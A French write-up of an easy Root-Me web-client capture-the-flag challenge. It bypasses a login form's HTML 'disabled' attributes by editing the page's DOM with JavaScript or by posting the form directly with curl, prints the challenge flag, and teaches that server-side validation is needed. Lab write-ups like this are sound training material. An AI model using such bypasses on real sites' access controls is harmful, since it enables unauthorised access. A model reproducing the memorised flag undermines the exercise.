# HTML - Boutons désactivés — Root-Me Web Client

**Points :** 10  
**Difficulté :** Facile  
**Catégorie :** HTML  
**Résolu le :** 2026-03-01  

## Énoncé

Un formulaire de login avec des boutons désactivés (`disabled`). Accéder à la zone membres.

## Analyse

La page `http://challenge01.root-me.org/web-client/ch25/` contient un formulaire avec des attributs `disabled` sur les inputs :

```html
<form action="" method="post" name="authform">
  <div>
    <input disabled="" type="text" name="auth-login" value="">
    <input disabled="" type="submit" value="Member access" name="authbutton">
  </div>
</form>
```

Les boutons sont désactivés côté HTML uniquement — côté serveur, aucune protection réelle.

## Exploitation

**Méthode 1 : Modifier le DOM via JS**
```javascript
document.querySelector('input[name="auth-login"]').removeAttribute('disabled');
document.querySelector('input[name="authbutton"]').removeAttribute('disabled');
```
Puis soumettre le formulaire avec n'importe quelle valeur.

**Méthode 2 : POST direct (curl)**
```bash
curl -X POST http://challenge01.root-me.org/web-client/ch25/ \
  -d "auth-login=admin&authbutton=Member+access"
```

Le serveur accepte toute valeur — la validation est uniquement côté client via `disabled`.

## Flag

`HTMLCantStopYou`

## Technique apprise

L'attribut HTML `disabled` n'offre aucune sécurité côté serveur. Toujours valider côté serveur, jamais se fier aux contrôles HTML/JS côté client. Contournement trivial via :
- DevTools → modifier le DOM
- curl / Burp → envoyer la requête directement
- JS console → `removeAttribute('disabled')`
